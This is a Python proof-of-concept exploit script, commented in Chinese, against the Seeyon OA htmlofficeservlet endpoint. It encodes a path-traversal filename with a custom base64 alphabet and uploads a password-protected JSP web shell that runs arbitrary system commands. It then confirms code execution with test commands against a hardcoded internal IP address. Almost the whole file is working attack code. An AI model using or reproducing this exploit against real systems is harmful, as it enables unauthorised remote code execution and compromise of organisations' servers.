# coding=utf-8
import sys
import requests


def encode(origin_bytes):
    """
    重构 base64 编码函数
    """
    # 将每一位bytes转换为二进制字符串
    base64_charset = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
    base64_bytes = ['{:0>8}'.format(bin(ord(b)).replace('0b', '')) for b in origin_bytes]

    resp = ''
    nums = len(base64_bytes) // 3
    remain = len(base64_bytes) % 3

    integral_part = base64_bytes[0:3 * nums]
    while integral_part:
        # 取三个字节，以每6比特，转换为4个整数
        tmp_unit = ''.join(integral_part[0:3])
        tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]
        # 取对应base64字符
        resp += ''.join([base64_charset[i] for i in tmp_unit])
        integral_part = integral_part[3:]

    if remain:
        # 补齐三个字节，每个字节补充 0000 0000
        remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '' * 8
        # 取三个字节，以每6比特，转换为4个整数
        # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=
        tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]
        resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='

    return resp


def getshell(urls):
    url = urls + "/seeyon/htmlofficeservlet"
    headers = {
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Upgrade-Insecure-Requests": "",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
    }
    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\checkload32.jsp')
    payload = """DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
OPTION=S3WYOSWLBSGr\r
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
CREATEDATE=wUghPB3szB3Xwg66\r
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
originalFileId=wV66\r
originalCreateDate=wUghPB3szB3Xwg66\r
FILENAME=""" + file_name + """\r
needReadFile=yRWZdAS6\r
originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("zs".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce"""
    requests.post(url=url, data=payload, headers=headers)
    print("-------------------")
    print(payload)
    result = requests.get(urls + "/seeyon/checkload32.jsp?pwd=zs&cmd=cmd+/c+echo+ZuoShou_Jsp_Shell")
    if 'ZuoShou_Jsp_Shell' in result.text:
        print(u'Jsp：Getshell成功\t{}'.format(urls + "/seeyon/checkload32.jsp?pwd=zs&cmd=cmd /c whoami"))
    else:
        print(u'Getshell失败')


if __name__ == '__main__':
    if len(sys.argv) == 2:
        print(u"\t\t用法：python poc.py 'http://loaclhost'")
    else:
        #url = sys.argv[1]
        url = "http://10.155.1.70"
        getshell(url)